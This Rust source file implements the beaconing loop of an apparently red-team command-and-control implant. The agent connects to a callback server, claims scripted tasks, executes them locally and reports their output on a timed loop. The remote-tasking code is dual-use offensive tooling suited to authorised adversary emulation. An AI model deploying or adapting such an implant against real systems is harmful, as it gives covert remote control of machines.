use crate::{config::Config, task::TaskHandle};
use anyhow::Result;
use c2::{
    pb::{Beacon, ClaimTasksRequest},
    TavernClient,
};
use eldritch::Runtime;
use std::time::{Duration, Instant};

pub struct Agent {
    info: Beacon,
    tavern: TavernClient,
    handles: Vec<TaskHandle>,
}

impl Agent {
    pub async fn gen_from_config(cfg: Config) -> Result<Agent> {
        let tavern = TavernClient::connect(cfg.callback_uri).await?;

        Ok(Agent {
            info: cfg.info,
            tavern,
            handles: Vec::new(),
        })
    }

    async fn claim_tasks(&mut self) -> Result<()> {
        let resp = self
            .tavern
            .claim_tasks(ClaimTasksRequest {
                beacon: Some(self.info.clone()),
            })
            .await?;

        // TODO: This
        let tasks = resp.get_ref().tasks.clone();

        #[cfg(debug_assertions)]
        log::info!("claimed {} tasks", tasks.len());

        for task in tasks {
            let tome = match task.tome {
                Some(t) => t,
                None => {
                    continue;
                }
            };

            let (runtime, output) = Runtime::new();
            let handle = tokio::task::spawn_blocking(move || runtime.run(tome));
            self.handles.push(TaskHandle::new(task.id, output, handle));

            #[cfg(debug_assertions)]
            log::info!("spawned task execution for id={}", task.id);
        }
        Ok(())
    }

    async fn report(&mut self) -> Result<()> {
        // Report output from each handle
        let mut idx = 0;
        while idx < self.handles.len() {
            self.handles[idx].report(&mut self.tavern).await?;

            // Drop any handles that have completed
            if self.handles[idx].is_finished() {
                self.handles.remove(idx);
                continue;
            }
            idx += 1;
        }

        Ok(())
    }

    /*
     * Callback once using the configured client to claim new tasks and report available output.
     */
    pub async fn callback(&mut self) -> Result<()> {
        self.claim_tasks().await?;
        self.report().await?;

        Ok(())
    }

    /*
     * Callback indefinitely using the configured client to claim new tasks and report available output.
     */
    pub async fn callback_loop(&mut self) {
        loop {
            let start = Instant::now();

            match self.callback().await {
                Ok(_) => {}
                Err(_err) => {
                    #[cfg(debug_assertions)]
                    log::error!("Error draining channel: {}", _err)
                }
            };

            let interval = self.info.interval.clone();
            let delay = match interval.checked_sub(start.elapsed().as_secs()) {
                Some(secs) => Duration::from_secs(secs),
                None => Duration::from_secs(0),
            };

            #[cfg(debug_assertions)]
            log::debug!(
                "completed callback in {}s, sleeping for {}s",
                start.elapsed().as_secs(),
                delay.as_secs()
            );

            std::thread::sleep(delay);
        }
    }
}
